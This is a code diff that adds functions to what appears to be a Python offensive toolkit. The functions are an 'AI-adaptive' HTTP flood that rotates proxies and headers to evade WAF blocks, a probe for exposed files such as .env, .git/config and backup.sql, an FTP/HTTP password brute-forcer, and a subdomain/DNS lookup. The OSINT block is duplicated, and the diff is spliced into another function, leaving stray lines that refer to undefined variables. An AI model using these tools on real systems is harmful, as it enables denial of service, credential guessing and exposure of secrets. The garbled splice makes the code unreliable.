@@ -857,6 +857,221 @@ def network_scanner(threads=200, custom_subnet=None):
             table.add_row(r['ip'], r['hostname'], r['status'], r['ports'], r['last_seen'])
 
     console.print("\n")
+    console.print(Panel(table, title="[bold cyan]🛰️ Discovery Summary[/bold cyan]", border_style="blue"))
+
+def adaptive_flood(url, duration, proxies=None, monitor=None):
+    """AI-Adaptive Smart Flood: Adjusts intensity based on server feedback"""
+    import random
+    import time
+    import requests
+    
+    end_time = time.time() + duration
+    intensity = 1.0 # Current intensity multiplier (0.1 to 2.0)
+    delay = 0.05
+    
+    add_system_log(f"[bold cyan]AI-ADAPTIVE:[/] Initiating smart flood on {url}")
+    
+    while time.time() < end_time:
+        try:
+            proxy = {"http": random.choice(proxies), "https": random.choice(proxies)} if proxies else None
+            headers = generate_stealth_headers()
+            
+            start_req = time.time()
+            resp = requests.get(url, headers=headers, proxies=proxy, timeout=5)
+            latency = time.time() - start_req
+            
+            # --- AI LOGIC: Adaptive Response ---
+            if resp.status_code == 200:
+                # Server is healthy, increase intensity slightly
+                intensity = min(2.0, intensity + 0.05)
+                delay = max(0.001, delay - 0.005)
+            elif resp.status_code == 429 or resp.status_code == 503:
+                # Rate limited or Overloaded, back off significantly
+                intensity = max(0.1, intensity - 0.3)
+                delay = min(1.0, delay + 0.2)
+                add_system_log(f"[yellow]ADAPTIVE:[/] Server pressured (Code {resp.status_code}), slowing down...")
+            elif resp.status_code == 403:
+                # Forbidden (WAF Block), change strategy
+                add_system_log(f"[red]ADAPTIVE:[/] WAF Block detected (403), rotating headers/proxies...")
+                headers = generate_stealth_headers()
+                time.sleep(1)
+            
+            if monitor:
+                monitor.update_stats(packets=1, bytes_sent=len(resp.content) if resp.content else 0)
+            
+            # Application of intensity delay
+            time.sleep(delay / intensity)
+            
+        except Exception:
+            if monitor: monitor.update_stats(failed=1)
+            time.sleep(0.5)
+
+def vulnerability_scout(target_url):
+    """Scans for sensitive files and common misconfigurations"""
+    import requests
+    from rich.progress import track
+    
+    if not target_url.startswith("http"): target_url = f"http://{target_url}"
+    
+    sensitive_files = [
+        ".env", ".git/config", "config.php", "wp-config.php", ".htaccess",
+        "phpinfo.php", "info.php", "setup.php", "install.php", "backup.sql",
+        "database.sql", "user.sql", "admin/", "cp/", "backup/", ".DS_Store"
+    ]
+    
+    found = []
+    add_system_log(f"[bold cyan]SCOUT:[/] Scanning {target_url} for vulnerabilities")
+    
+    console.print(f"\n[bold yellow]🔍 Starting Vulnerability Scout on {target_url}[/bold yellow]")
+    
+    for path in track(sensitive_files, description="[cyan]Scanning...[/]"):
+        url = f"{target_url.rstrip('/')}/{path}"
+        try:
+            r = requests.get(url, timeout=3, allow_redirects=False)
+            if r.status_code == 200:
+                if len(r.content) > 0:
+                    found.append((path, r.status_code, len(r.content)))
+            elif r.status_code == 403:
+                found.append((path, 403, "Forbidden (Hidden)"))
+        except:
+            continue
+            
+    table = Table(title=f"Vulnerability Report: {target_url}", border_style="red")
+    table.add_column("Path", style="cyan")
+    table.add_column("Status", style="bold")
+    table.add_column("Size / Note", style="white")
+    
+    if not found:
+        table.add_row("No sensitive files found", "-", "-")
+    else:
+        for f in found:
+            status_style = "green" if f[1] == 200 else "yellow"
+            table.add_row(f[0], f"[{status_style}]{f[1]}[/]", str(f[2]))
+            add_system_log(f"[red]VULN FOUND:[/] {f[0]} accessible on {target_url}")
+
+    console.print(Panel(table, border_style="red"))
+
+def brute_force_suite(target, service, username="admin"):
+    """Basic credential tester for common services (SSH/FTP/HTTP)"""
+    import socket
+    from rich.progress import track
+    
+    common_passwords = ["admin", "password", "123456", "admin123", "root", "user", "guest"]
+    add_system_log(f"[bold cyan]BRUTE:[/] Starting {service} test on {target}")
+    
+    found_pass = None
+    
+    if service.lower() == "ftp":
+        import ftplib
+        for pwd in track(common_passwords, description=f"Testing {service} passwords"):
+            try:
+                ftp = ftplib.FTP(target, timeout=5)
+                ftp.login(username, pwd)
+                ftp.quit()
+                found_pass = pwd
+                break
+            except:
+                continue
+    
+    elif service.lower() == "http":
+        import requests
+        for pwd in track(common_passwords, description=f"Testing {service} passwords"):
+            try:
+                # Basic Auth
+                r = requests.get(f"http://{target}", auth=(username, pwd), timeout=5)
+                if r.status_code == 200:
+                    found_pass = pwd
+                    break
+            except:
+                continue
+    
+    # Placeholder for more protocols
+    
+    if found_pass:
+        msg = f"[bold green]SUCCESS![/] Found password for [cyan]{username}[/]: [yellow]{found_pass}[/]"
+        console.print(Panel(msg, title="Brute Force Result", border_style="green"))
+        add_system_log(f"[green]BRUTE SUCCESS:[/] Found credentials for {target}")
+    else:
+        console.print("[bold red]FAILED:[/] No common passwords match.")
+
+def domain_osint(domain):
+    """Information gathering for domains (Subdomains, DNS)"""
+    import requests
+    from rich.table import Table
+    
+    add_system_log(f"[bold cyan]OSINT:[/] Hunting subdomains for {domain}")
+    console.print(f"\n[bold cyan]🌐 Domain Intel Hunting: {domain}[/bold cyan]")
+    
+    # 1. Subdomain Lookup (Using hackertarget API for efficiency)
+    try:
+        sub_resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
+        subdomains = sub_resp.text.split("\n")
+    except:
+        subdomains = ["Error fetching subdomains"]
+
+    # 2. DNS Lookup (A, MX, TXT)
+    try:
+        dns_resp = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
+        dns_info = dns_resp.text
+    except:
+        dns_info = "Error fetching DNS info"
+
+    table = Table(title=f"OSINT REPORT: {domain}", border_style="blue")
+    table.add_column("Category", style="cyan")
+    table.add_column("Results", style="white")
+    
+    sub_count = len([s for s in subdomains if s.strip()])
+    table.add_row("Subdomains Found", str(sub_count))
+    
+    # Show first 10 subdomains
+    top_subs = "\n".join([s.split(",")[0] for s in subdomains[:10]])
+    table.add_row("Top Subdomains", top_subs)
+    
+    console.print(Panel(table, border_style="blue"))
+    
+    # DNS Table
+    dns_table = Table(title="DNS Records", show_header=False, border_style="dim")
+    dns_table.add_column("Data")
+    for line in dns_info.split("\n")[:15]:
+        if line.strip(): dns_table.add_row(line)
+        
+    console.print(Panel(dns_table, border_style="cyan", title="DNS Intel"))
+    console.print(f"\n[bold cyan]🌐 Domain Intel Hunting: {domain}[/bold cyan]")
+    
+    # 1. Subdomain Lookup (Using hackertarget API for efficiency)
+    try:
+        sub_resp = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
+        subdomains = sub_resp.text.split("\n")
+    except:
+        subdomains = ["Error fetching subdomains"]
+
+    # 2. DNS Lookup (A, MX, TXT)
+    try:
+        dns_resp = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=10)
+        dns_info = dns_resp.text
+    except:
+        dns_info = "Error fetching DNS info"
+
+    table = Table(title=f"OSINT REPORT: {domain}", border_style="blue")
+    table.add_column("Category", style="cyan")
+    table.add_column("Results", style="white")
+    
+    sub_count = len([s for s in subdomains if s.strip()])
+    table.add_row("Subdomains Found", str(sub_count))
+    
+    # Show first 10 subdomains
+    top_subs = "\n".join([s.split(",")[0] for s in subdomains[:10]])
+    table.add_row("Top Subdomains", top_subs)
+    
+    console.print(Panel(table, border_style="blue"))
+    
+    # DNS Table
+    dns_table = Table(title="DNS Records", show_header=False, border_style="dim")
+    dns_table.add_column("Data")
+    for line in dns_info.split("\n")[:15]:
+        if line.strip(): dns_table.add_row(line)
+        
+    console.print(Panel(dns_table, border_style="cyan", title="DNS Intel"))
     console.print(table)
     console.print(Panel(f"[bold green]✅ Scan Complete! Online: {len(results)} | Tracked Offline: {len(display_results)-len(results)}[/bold green]", border_style="blue"))
 
